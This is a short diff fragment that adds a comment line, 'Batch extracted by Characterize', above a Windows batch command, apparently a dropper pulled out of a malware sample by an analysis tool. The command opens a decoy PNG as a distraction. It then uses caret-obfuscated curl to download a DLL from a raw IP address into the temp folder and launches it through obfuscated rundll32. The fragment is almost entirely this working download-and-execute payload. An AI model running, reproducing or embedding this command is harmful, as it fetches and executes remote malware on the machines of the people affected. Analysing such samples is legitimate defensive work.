@@ -1,1 +1,2 @@
+REM Batch extracted by Characterize
 start 2YFRUxV1.png && c^u^rl ""http://138.124.183.52/zazaz/poJvYMKG2T4IG3FTaI3C61d9kqrjaTG4jQ~~/Y9KL4c43P_KjnBiEEcDDqtfX-bmhiyLj8g~~/"" -o %temp%\9jXqQZQh.dll && start r^un^dl^l3^2 %temp%\9jXqQZQh.d^l^l, #1
